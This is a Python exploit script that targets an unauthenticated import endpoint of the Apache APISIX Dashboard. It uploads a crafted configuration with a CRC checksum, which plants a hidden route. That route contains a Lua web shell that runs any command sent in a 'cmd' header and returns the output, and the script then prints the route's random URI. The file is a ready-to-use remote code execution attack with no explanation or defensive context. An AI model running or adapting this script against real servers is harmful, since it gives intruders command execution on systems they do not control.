#!/usr/bin/env python3
import zlib
import json
import random
import requests
import string
import sys
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


eval_config = {
    "Counsumers": [],
    "Routes": [
        {
            "id": str(random.randint(100000000000000000, 1000000000000000000)),
            "create_time": 1640674554,
            "update_time": 1640677637,
            "uris": [
                "/rce"
            ],
            "name": "rce",
            "methods": [
                "GET",
                "POST",
                "PUT",
                "DELETE",
                "PATCH",
                "HEAD",
                "OPTIONS",
                "CONNECT",
                "TRACE"
            ],
            "script": "local file = io.popen(ngx.req.get_headers()['cmd'],'r') \n local output = file:read('*all') \n file:close() \n ngx.say(output)",
            "status": 1
        }
    ],
    "Services": [],
    "SSLs": [],
    "Upstreams": [],
    "Scripts": [],
    "GlobalPlugins": [],
    "PluginConfigs": []
}


def random_str():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=6))


def calc_crc(data):
    crc32 = zlib.crc32(data) & 0xffffffff
    return crc32.to_bytes(4, byteorder="big")


def export_data(url):
    r = requests.get(url + "/apisix/admin/migrate/export", verify=False)
    return r.text[:-4]


def import_data(url, data):
    data = json.dumps(data).encode()
    crc32 = calc_crc(data)

    files = {"file": ("data", data + crc32, "text/data")}
    resp = requests.post(url + "/apisix/admin/migrate/import", files=files, verify=False)
    # print(resp.text)
    if resp.json().get("code", -1) == 0:
        return True
    else:
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("python " + sys.argv[0] + " http://127.0.0.1:9000")
        exit()
    
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]

    uri = random_str()
    eval_config["Routes"][0]["uris"] = [ "/" + uri]
    eval_config["Routes"][0]["name"] = uri

    if import_data(url, eval_config):
        print("attack success")
        print("uri is: " + "/" + uri)
    else:
        print("attack error")


